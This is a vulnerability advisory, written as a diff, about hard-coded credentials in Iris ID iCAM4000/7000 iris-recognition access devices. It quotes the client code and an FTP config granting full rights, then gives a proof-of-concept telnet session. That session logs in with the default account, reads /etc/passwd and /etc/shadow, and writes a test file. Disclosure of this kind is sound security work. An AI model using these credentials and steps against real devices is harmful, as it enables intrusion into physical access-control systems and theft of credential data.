@@ -1,0 +1,205 @@
+﻿
+Iris ID IrisAccess iCAM4000/iCAM7000 Hardcoded Credentials Remote Shell Access
+
+
+Vendor: Iris ID, Inc.
+Product web page: http://www.irisid.com
+                  http://www.irisid.com/productssolutions/irisaccesssystem/irisaccess4000/
+                  http://www.irisid.com/productssolutions/hardwareproducts/icam4000series/
+                  http://www.irisid.com/productssolutions/irisaccesssystem/irisaccess7000/
+                  http://www.irisid.com/productssolutions/hardwareproducts/icam7-series/
+
+Affected version: iCAM4000:
+                  iCAM Software: 3.09.02
+                  iCAM File system: 1.3
+                  CMR Firmware: 5.5 and 3.8
+                  EIF Firmware: 9.5 and 8.0
+                  HID iClass Library: 2.01.05
+                  ImageData Library: 1.153
+                  Command Process: 1.02
+
+                  iCAM7000:
+                  iCAM Software: 8.01.07
+                  iCAM File system: 1.4.0
+                  EIF Firmware: 1.9
+                  HID iClass Library: 1.00.00
+                  ImageData Library: 01.01.32
+                  EyeSeek Library: 5.00
+                  Countermeasure Library: 3.00
+                  LensFinder Library: 5.00
+                  Tilt Assist Library: 4.00
+
+Summary: The 4th generation IrisAccess™ 7000 series iris recognition solution offered
+by Iris ID provides fast, secure, and highly accurate, non-contact identification
+by the iris of the eye. The iCAM7000's versatility and flexibility allows for easy
+integration with many Wiegand and network based access control, time and attendance,
+visitor management and point of sale applications.
+
+The iCAM4000 or 4010 with embedded smart card is the best-selling model in the IrisAccess
+4000 range. Simultaneous two-eye capture, face-badging camera, motorized height adjust,
+iCAM4000 is easily configured for use in a kiosk as well as in applications where a traditional
+wall-mount is used.
+
+Desc: The Iris ID IrisAccess iCAM4000/7000 series suffer from a use of hard-coded credentials.
+When visiting the device interface with a browser on port 80, the application loads an applet
+JAR file 'ICAMClient.jar' into user's browser which serves additional admin features. In the
+JAR file there is an account 'rou' with password 'iris4000' that has read and limited write
+privileges on the affected node. An attacker can access the device using these credentials
+starting a simple telnet session on port 23 gaining access to sensitive information and/or
+FTP access on port 21 (with EVERYTHING allowed) and uploading malicious content.
+
+=====================================================================================
+
+/html/ICAMClient.jar (ICAMClient.java):
+---------------------------------------
+
+97:  param_host = getParameter("host");
+98:  param_user = "rou";//getParameter("user");
+99:  param_pass = "iris4000";//getParameter("pass"); // password
+100: param_path = getParameter("path"); // path on the server
+
+
+/etc/ftpd/ftpd.conf:
+--------------------
+
+69:  # User list:
+70:  # Format:  user=<login> <passwd> <subdir> <maxlogins> <flags>
+71:  #           <login>     user name
+72:  #           <passwd>    password or * for anonymous access
+73:  #           <subdir>    (internally appended to serverroot)
+74:  #                       the user has access to the WHOLE SUBTREE,
+75:  #                       if the server has access to it
+76:  #           <maxlogins> maximal logins with this usertype
+77:  #           <flags>     D - download
+78:  #                       U - upload + making directories
+79:  #                       O - overwrite existing files
+80:  #                       M - allows multiple logins
+81:  #                       E - allows erase operations
+82:  #                       A - allows EVERYTHING(!)
+101: 
+103: user=rou iris4000 / 5 A
+
+=====================================================================================
+
+
+Tested on: GNU/Linux 2.4.19 (armv5tel)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5347
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5347.php
+
+
+06.05.2016
+
+--
+
+
+telnet [IP]
+iCAM4000 login: rou
+Password:
+[rou@iCAM4000 rou]# id
+uid=500(rou) gid=500(rou) groups=500(rou)
+[rou@iCAM4000 rou]# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:
+operator:x:11:0:operator:/root:
+games:x:12:100:games:/usr/games:
+gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ftp:x:14:50:FTP User:/home/ftp:
+nobody:x:99:99:Nobody:/:
+rou:x:500:500::/home/rou:/bin/bash
+[rou@iCAM4000 rou]# cd /web
+[rou@iCAM4000 /web]# ls -al
+total 0
+drwxrwxr-x    1 rou      rou             0 Jul 26 07:22 .
+drwxr-xr-x    1 root     root            0 Jan  1  1970 ..
+drwxrwxr-x    1 rou      rou             0 Jan 31  2013 cgi-bin
+drwxrwxr-x    1 rou      rou             0 Jan 31  2013 html
+drwxrwxr-x    1 rou      rou             0 Jan 31  2013 images
+[rou@iCAM4000 /web]# cat /etc/shadow
+root:{{REMOVED}}
+bin:*:10897:0:99999:7:::
+daemon:*:10897:0:99999:7:::
+adm:*:10897:0:99999:7:::
+lp:*:10897:0:99999:7:::
+sync:*:10897:0:99999:7:::
+shutdown:*:10897:0:99999:7:::
+halt:*:10897:0:99999:7:::
+mail:*:10897:0:99999:7:::
+news:*:10897:0:99999:7:::
+uucp:*:10897:0:99999:7:::
+operator:*:10897:0:99999:7:::
+games:*:10897:0:99999:7:::
+gopher:*:10897:0:99999:7:::
+ftp:*:10897:0:99999:7:::
+nobody:*:10897:0:99999:7:::
+rou:$1$LfhrWa0e$Crfm4qz7MFEaWaA77NFci0:12702:0:99999:7:::
+[rou@iCAM4000 /web]# cat /etc/issue
+
+Iris@ID iCAM4000 Linux (experimental)
+Kernel 2.4.19-rmk7-pxa1 on an armv5tel
+[rou@iCAM4000 /web]# ls -al html/
+total 289
+drwxrwxr-x    1 rou      rou             0 Jan 31  2013 .
+drwxrwxr-x    1 rou      rou             0 Jul 26 07:22 ..
+-rw-rw-r--    1 rou      rou          4035 Jan 31  2013 DHCPSettings_reboot.htm
+-rw-rw-r--    1 rou      rou        100614 Jan 10  2008 ICAMClient.jar
+-rw-rw-r--    1 rou      rou          6376 Jan 31  2013 WiegandSettings.htm
+-rw-rw-r--    1 rou      rou          5643 Jan 31  2013 authentication.htm
+-rw-rw-r--    1 rou      rou          6166 Jan 31  2013 changeusername.htm
+-rw-rw-r--    1 rou      rou          4816 Jan 31  2013 displayconfigsettings.htm
+-rw-rw-r--    1 rou      rou          5643 Jan 31  2013 downloadauthentication.htm
+-rw-rw-r--    1 rou      rou          4850 Jan 31  2013 downloadvoice_result.htm
+-rw-rw-r--    1 rou      rou          3237 Jan 31  2013 error.htm
+-rw-rw-r--    1 rou      rou          3234 Jan 31  2013 error_ip.htm
+-rw-rw-r--    1 rou      rou          3248 Jan 31  2013 error_loginfailure.htm
+-rw-rw-r--    1 rou      rou          3349 Jan 31  2013 error_usb_ip.htm
+-rw-rw-r--    1 rou      rou          6128 Jan 31  2013 ftpupload.htm
+-rw-rw-r--    1 rou      rou          5331 Jan 31  2013 iCAMConfig.htm
+-rw-rw-r--    1 rou      rou          4890 Jan 31  2013 icamconfig_reboot.htm
+-rw-rw-r--    1 rou      rou          5314 Jan 31  2013 index.htm
+-rw-rw-r--    1 rou      rou          7290 Jan 31  2013 main.htm
+-rw-rw-r--    1 rou      rou          3662 Jan 31  2013 reboot_result.htm
+-rw-rw-r--    1 rou      rou          5782 Jan 31  2013 smartcardauthentication.htm
+-rw-rw-r--    1 rou      rou         17783 Jan 31  2013 smartcardconfig.htm
+-rw-rw-r--    1 rou      rou          4895 Jan 31  2013 smartcardconfig_reboot.htm
+-rw-rw-r--    1 rou      rou          5809 Jan 31  2013 smartcardconfig_result.htm
+-rw-rw-r--    1 rou      rou          3672 Jan 31  2013 systeminfo.htm
+-rw-rw-r--    1 rou      rou          5870 Jan 31  2013 updateicamconfig.htm
+-rw-rw-r--    1 rou      rou          4239 Jan 31  2013 updateicamconfig_result.htm
+-rw-rw-r--    1 rou      rou          6612 Jan 31  2013 updatenetworksettings.htm
+-rw-rw-r--    1 rou      rou          4651 Jan 31  2013 updatenetworksettings_result.htm
+-rw-rw-r--    1 rou      rou          5014 Jan 31  2013 updatenetworksettings_state.htm
+-rw-rw-r--    1 rou      rou          3985 Jan 31  2013 upload.htm
+-rw-rw-r--    1 rou      rou          5645 Jan 31  2013 uploadauthentication.htm
+-rw-rw-r--    1 rou      rou          4737 Jan 31  2013 uploadiriscapture_result.htm
+-rw-rw-r--    1 rou      rou          6028 Jan 31  2013 voicemessagedownload.htm
+-rw-rw-r--    1 rou      rou          6299 Jan 31  2013 voicemessageupdate.htm
+-rw-rw-r--    1 rou      rou          5645 Jan 31  2013 wiegandauthentication.htm
+-rw-rw-r--    1 rou      rou          4893 Jan 31  2013 wiegandconfig_reboot.htm
+[rou@iCAM4000 /web]# echo $SHELL
+/bin/bash
+[rou@iCAM4000 /web]# echo pwn > test.write
+[rou@iCAM4000 /web]# cat test.write
+pwn
+[rou@iCAM4000 /web]# rm -rf test.write
+[rou@iCAM4000 /web]# cd /etc/ftpd
+[rou@iCAM4000 ftpd]# pwd
+/etc/ftpd
+[rou@iCAM4000 ftpd]# cat ftpd.conf |grep user=rou
+user=rou iris4000 / 5 A
+[rou@iCAM4000 ftpd]# ^D
+Connection to host lost.
